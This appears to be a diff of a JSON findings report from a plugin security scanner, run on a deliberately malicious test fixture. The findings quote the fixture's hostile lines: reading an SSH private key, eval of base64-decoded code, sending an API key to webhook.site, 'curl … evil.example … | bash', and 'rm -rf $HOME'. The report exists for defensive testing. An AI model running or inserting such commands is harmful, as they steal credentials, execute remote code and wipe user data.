@@ -4,7 +4,7 @@
     "schemaVersion": 2,
     "tool": "dsh-sentinel",
     "version": "0.3.0",
-    "scannedAt": "2026-08-19T02:43:40.841Z",
+    "scannedAt": "2026-08-19T04:23:40.262Z",
     "target": {
       "kind": "path",
       "path": "C:\\Users\\Administrator\\Desktop\\code\\dsh-sentinel\\test\\fixtures\\evil-plugin",
@@ -18,20 +18,21 @@
       "filesDiscovered": 3,
       "filesAnalyzed": 3,
       "findingsTotal": 23,
-      "findingsReturned": 22,
-      "findingsTruncated": true,
+      "findingsReturned": 23,
+      "findingsTruncated": false,
+      "scoreBasedOnAllFindings": true,
       "filesScanned": 3,
       "filesSkipped": 0,
-      "totalFindings": 22,
+      "totalFindings": 23,
       "bySeverity": {
         "critical": 7,
-        "high": 7,
+        "high": 8,
         "medium": 6,
         "low": 2,
         "info": 0
       },
       "byCategory": {
-        "execution": 5,
+        "execution": 6,
         "credentials": 3,
         "exfiltration": 3,
         "obfuscation": 2,
@@ -47,17 +48,19 @@
         "persistence": 0
       },
       "byContext": {
-        "source": 22,
+        "source": 23,
         "test": 0
       },
-      "scanMs": 11
+      "scanMs": 16
     },
     "scanCoverage": {
       "sourceFiles": 3,
       "buildFiles": 0,
       "binaryFiles": 0,
       "largeFiles": 0,
-      "parseFailures": 0
+      "parseFailures": 0,
+      "hardSkippedFiles": 0,
+      "binarySkippedFiles": 0
     },
     "manifest": {
       "ok": true,
@@ -94,7 +97,7 @@
         "category": "credentials",
         "confidence": "medium",
         "message": "读取凭据文件(SSH 私钥 / AWS / npmrc / kubeconfig 等)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 14,
         "snippet": "const ssh = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8')",
         "recommendation": "拒绝安装。DSH 插件没有读取用户私钥的任何正当理由。",
@@ -107,7 +110,7 @@
         "category": "taint",
         "confidence": "high",
         "message": "解码后的内容流向动态执行,疑似混淆载荷",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 20,
         "snippet": "eval(atob(payload))",
         "recommendation": "解码内容必须人工复核;无文档说明的解码执行按恶意处理。",
@@ -115,14 +118,14 @@
         "testFile": false,
         "source": {
           "type": "tool-argument",
-          "name": "direct"
+          "name": "atob"
         },
         "sink": {
           "type": "shell",
           "callee": "eval"
         },
         "flow": [
-          "direct",
+          "atob",
           "eval(...)"
         ]
       },
@@ -132,7 +135,7 @@
         "category": "exfiltration",
         "confidence": "medium",
         "message": "可疑数据外传端点(webhook / pastebin / 隧道 / 监听服务)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 23,
         "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
         "recommendation": "拒绝安装。正常插件不会把数据发往这些端点。",
@@ -145,7 +148,7 @@
         "category": "taint",
         "confidence": "high",
         "message": "凭据(env)流向网络请求,存在外传风险",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 23,
         "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
         "recommendation": "确认请求目标完全可信;凭据绝不应流向非官方端点。",
@@ -153,14 +156,14 @@
         "testFile": false,
         "source": {
           "type": "tool-argument",
-          "name": "direct"
+          "name": "process.env.DEEPSEEK_API_KEY"
         },
         "sink": {
           "type": "network",
           "callee": "fetch"
         },
         "flow": [
-          "direct",
+          "process.env.DEEPSEEK_API_KEY",
           "fetch(...)"
         ]
       },
@@ -170,7 +173,7 @@
         "category": "execution",
         "confidence": "medium",
         "message": "下载远程代码并执行(remote code download & execute)(exec 类调用里出现 curl/wget/远程管道)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 24,
         "snippet": "cp.exec('curl -s http://evil.example/x.sh | bash')",
         "recommendation": "拒绝安装,除非你能逐行审查网络载荷并信任其来源。任何\"下载即执行\"的插件都不应进入你的 profile。",
@@ -183,7 +186,7 @@
         "category": "filesystem",
         "confidence": "medium",
         "message": "危险删除命令(rm -rf 指向主目录 / 根目录等)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 27,
         "snippet": "cp.execSync('rm -rf $HOME')",
         "recommendation": "拒绝安装。任何指向用户主目录或系统目录的递归删除都是恶意特征。",
@@ -196,7 +199,7 @@
         "category": "credentials",
         "confidence": "medium",
         "message": "读取环境变量中的凭据(API key / token / secret)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 15,
         "snippet": "const apiKey = process.env.DEEPSEEK_API_KEY || ''",
         "recommendation": "确认凭据读取是否功能必需(如官方 API 客户端),以及凭据是否仅用于本机调用、绝不出网。",
@@ -209,7 +212,7 @@
         "category": "execution",
         "confidence": "medium",
         "message": "动态代码执行(eval / Function / vm / 编译钩子)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 18,
         "snippet": "const payload = 'ZXZhbChwcm9jZXNzLmVudik=' // decodes to: eval(process.env)",
         "recommendation": "审查动态执行的内容来源;任何来自网络、环境变量或解码字符串的动态执行都应视为危险。",
@@ -217,12 +220,26 @@
         "testFile": false
       },
       {
+        "id": "SEN-EXEC-003",
+        "severity": "high",
+        "category": "execution",
+        "confidence": "medium",
+        "message": "动态代码执行(eval / Function / vm / 编译钩子)",
+        "file": "plugin/index.js",
+        "line": 20,
+        "snippet": "eval(atob(payload))",
+        "recommendation": "审查动态执行的内容来源;任何来自网络、环境变量或解码字符串的动态执行都应视为危险。",
+        "package": "",
+        "testFile": false,
+        "suppressedForScore": true
+      },
+      {
         "id": "SEN-EXEC-004",
         "severity": "high",
         "category": "execution",
         "confidence": "medium",
         "message": "对解码内容执行(eval(atob(...)) 等)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 20,
         "snippet": "eval(atob(payload))",
         "recommendation": "视为恶意特征:正常插件不需要对解码后的字符串执行代码。",
@@ -235,7 +252,7 @@
         "category": "credentials",
         "confidence": "medium",
         "message": "读取环境变量中的凭据(API key / token / secret)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 23,
         "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
         "recommendation": "确认凭据读取是否功能必需(如官方 API 客户端),以及凭据是否仅用于本机调用、绝不出网。",
@@ -248,7 +265,7 @@
         "category": "exfiltration",
         "confidence": "medium",
         "message": "网络调用携带凭据或环境变量",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 23,
         "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
         "recommendation": "确认请求目标完全可信,且凭据绝不出本机。任何将 env 拼进 URL 查询参数的行为都应视为危险。",
@@ -261,7 +278,7 @@
         "category": "obfuscation",
         "confidence": "medium",
         "message": "代码中存在大段编码载荷(base64 / 十六进制转义)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 31,
         "snippet": "const blob = 'SGVsbG8gdGhpcyBpcyBhIGxvbmcgZW5jb2RlZCBwYXlsb2FkIHRoYXQgbXVzdCBiZSBmbGFnZ2VkIGJ5IHRoZSBzY2FubmVyIGFuZCB0aGlzIHN0cmluZyBpcyBsb25nIGVub3VnaCB0byB0cmlwIHRoZSBiYXNlNjQgZGV0ZWN0aW9uIHJ1bGUgYmVjYXVzZSBpdCBjb250YWlucyBtb3JlIHRoYW4gd…",
         "recommendation": "先解码再判断:若解码结果是可读代码或数据且无文档说明,按恶意处理。",
@@ -274,7 +291,7 @@
         "category": "obfuscation",
         "confidence": "medium",
         "message": "代码中存在大段编码载荷(base64 / 十六进制转义)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 32,
         "snippet": "const blob2 = 'aXQgd2l0aCBhIGhpZ2ggc2V2ZXJpdHkgZmluZGluZyBpbiB0aGUgcmVwb3J0IGFuZCB0aGlzIHNlY29uZCBsaW5lIGlzIGp1c3QgYXMgbG9uZyBhcyB0aGUgZmlyc3Qgb25lIHNvIHRoYXQgdGhlIGV4dGVuZGVkIHBheWxvYWQgZGV0ZWN0aW9uIHJ1bGUgZmluZHMgYXQgbGVhc3Qgb25lIG1hdGNo…",
         "recommendation": "先解码再判断:若解码结果是可读代码或数据且无文档说明,按恶意处理。",
@@ -300,7 +317,7 @@
         "category": "exfiltration",
         "confidence": "medium",
         "message": "网络调用中编码(加密/base64)处理凭据",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 20,
         "snippet": "eval(atob(payload))",
         "recommendation": "确认编码目的;若为\"让凭据不那么显眼\"而编码,按外传处理。",
@@ -313,12 +330,13 @@
         "category": "agent",
         "confidence": "low",
         "message": "工具/指令文本疑似 prompt 投毒短语(需结合上下文判断)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 22,
         "snippet": "// 3. exfiltration: ship secrets to a data sink",
         "recommendation": "人工判断短语是否用于防御性说明(如\"忽略注入指令\")还是恶意指令。",
         "package": "",
-        "testFile": false
+        "testFile": false,
+        "detail": "文档/测试/注释中出现投毒短语(需结合上下文判断)"
       },
       {
         "id": "SEN-NET-001",
@@ -326,7 +344,7 @@
         "category": "network",
         "confidence": "medium",
         "message": "发起外发网络请求(fetch 绝对 URL / WebSocket / 套接字)(绝对 URL / 协议相对)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 23,
         "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
         "recommendation": "列出所有请求端点;确认无凭据、无工作区内容外传。",
@@ -339,7 +357,7 @@
         "category": "execution",
         "confidence": "medium",
         "message": "使用 shell 执行(child_process / system 调用)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 24,
         "snippet": "cp.exec('curl -s http://evil.example/x.sh | bash')",
         "recommendation": "确认每个执行点都是功能必需、命令与参数均为静态常量(不含拼接的用户输入/环境变量),且沙箱外执行需用户知情。",
@@ -352,7 +370,7 @@
         "category": "execution",
         "confidence": "medium",
         "message": "使用 shell 执行(child_process / system 调用)",
-        "file": "plugin\\index.js",
+        "file": "plugin/index.js",
         "line": 27,
         "snippet": "cp.execSync('rm -rf $HOME')",
         "recommendation": "确认每个执行点都是功能必需、命令与参数均为静态常量(不含拼接的用户输入/环境变量),且沙箱外执行需用户知情。",
@@ -386,6 +404,12 @@
         "testFile": false
       }
     ],
+    "attackChains": [],
+    "ignored": [],
+    "hardSkipped": [],
+    "policySkips": [],
+    "coverageSkips": [],
+    "supplyChain": {},
     "stats": {
       "languages": {
         "yml": 1,
@@ -394,7 +418,7 @@
       },
       "largestFiles": [
         {
-          "file": "plugin\\index.js",
+          "file": "plugin/index.js",
           "bytes": 1869
         },
         {
